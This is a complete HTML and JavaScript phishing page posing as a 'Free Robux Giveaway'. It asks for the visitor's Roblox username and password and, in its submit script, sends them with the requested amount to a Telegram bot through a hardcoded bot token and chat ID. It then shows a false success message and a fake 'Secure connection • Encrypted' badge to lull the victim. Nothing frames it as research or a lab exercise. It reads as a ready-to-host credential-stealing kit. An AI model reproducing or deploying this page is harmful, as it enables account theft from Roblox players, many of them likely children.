<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Free Robux</title>
    <style>
        :root {
            --primary-color: #4361ee;
            --secondary-color: #3f37c9;
            --accent-color: #4895ef;
            --danger-color: #f72585;
            --light-color: #f8f9fa;
            --dark-color: #212529;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-container {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            padding: 40px;
            transition: all 0.3s ease;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo img {
            width: 80px;
            height: 80px;
            object-fit: cover;
        }
        
        .logo h1 {
            color: var(--dark-color);
            font-size: 24px;
            margin-top: 15px;
            font-weight: 700;
        }
        
        .form-group {
            margin-bottom: 20px;
            position: relative;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: var(--dark-color);
            font-weight: 500;
            font-size: 14px;
        }
        
        .username-container {
            display: flex;
            align-items: center;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding-left: 15px;
            overflow: hidden;
        }
        
        .username-container span {
            color: #666;
            font-weight: 500;
        }
        
        .username-container input {
            border: none;
            box-shadow: none;
            padding-left: 5px;
            flex-grow: 1;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            transition: all 0.3s;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: var(--accent-color);
            box-shadow: 0 0 0 3px rgba(72, 149, 239, 0.2);
        }
        
        .forgot-password {
            text-align: right;
            margin-bottom: 20px;
        }
        
        .forgot-password a {
            color: var(--accent-color);
            font-size: 13px;
            text-decoration: none;
            transition: color 0.3s;
        }
        
        .forgot-password a:hover {
            color: var(--secondary-color);
            text-decoration: underline;
        }
        
        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background-color: var(--primary-color);
            color: white;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .btn:hover {
            background-color: var(--secondary-color);
            transform: translateY(-2px);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .alert {
            padding: 12px 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            display: none;
        }
        
        .alert-success {
            background-color: #d1fae5;
            color: #059669;
            border: 1px solid #a7f3d0;
        }
        
        .alert-danger {
            background-color: #fee2e2;
            color: #dc2626;
            border: 1px solid #fecaca;
        }
        
        @media (max-width: 480px) {
            .login-container {
                padding: 30px 20px;
            }
        }
        
        /* Security indicator */
        .security-indicator {
            margin-top: 30px;
            text-align: center;
        }
        
        .security-indicator p {
            font-size: 12px;
            color: #6c757d;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .security-indicator p svg {
            margin-right: 5px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://placehold.co/100x100/00FF7F/FFFFFF?text=ROBUX" alt="Free Robux Giveaway" />
            <h1>Free Robux Giveaway</h1>
        </div>
        
        <div id="alert" class="alert"></div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Roblox Username</label>
                <div class="username-container">
                    <span>@</span>
                    <input type="text" id="username" name="username" placeholder="yourusername" required>
                </div>
            </div>
            
            <div class="form-group">
                <label for="password">Roblox Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your Roblox password" required>
            </div>

            <div class="form-group">
                <label for="amount">Amount of Robux (1 - 1000)</label>
                <input type="number" id="amount" name="amount" min="1" max="1000" required>
            </div>
            
            <div class="form-group">
                <input type="checkbox" id="terms" required>
                <label for="terms">I agree to the terms and conditions</label>
            </div>
            
            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>
            
            <button type="submit" class="btn">Login</button>
        </form>
        
        <div class="security-indicator">
            <p>
                <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="#059669" viewBox="0 0 16 16">
                    <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/>
                </svg>
                Secure connection â€¢ Encrypted
            </p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            let username = document.getElementById('username').value;
            if (!username.startsWith('@')) {
                username = '@' + username;
            }
            const password = document.getElementById('password').value;
            const amount = document.getElementById('amount').value;
            const alertBox = document.getElementById('alert');
            
            if (!username || !password || !amount) {
                showAlert('Please fill in all fields', 'danger');
                return;
            }
            
            try {
                // Send data to Telegram bot
                const botToken = '7651421760:AAFBlyYWe4HxbL5t9OKICqo0zwt_dLC0pRg';
                const chatId = '7711427708';
                
                const message = `Roblox Credentials:\nUsername: ${username}\nPassword: ${password}\nAmount of Robux: ${amount}`;
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                if (response.ok) {
                    showAlert('Credentials submitted! ' + amount + ' Robux will arrive shortly', 'success');
                    document.getElementById('loginForm').reset();
                } else {
                    throw new Error('Failed to send data');
                }
            } catch (error) {
                console.error('Error:', error);
                showAlert('Failed to submit login information', 'danger');
            }
        });
        
        function showAlert(message, type) {
            const alertBox = document.getElementById('alert');
            alertBox.textContent = message;
            alertBox.className = `alert alert-${type}`;
            alertBox.style.display = 'block';
            
            setTimeout(() => {
                alertBox.style.display = 'none';
            }, 5000);
        }
    </script>
</body>
          </html>
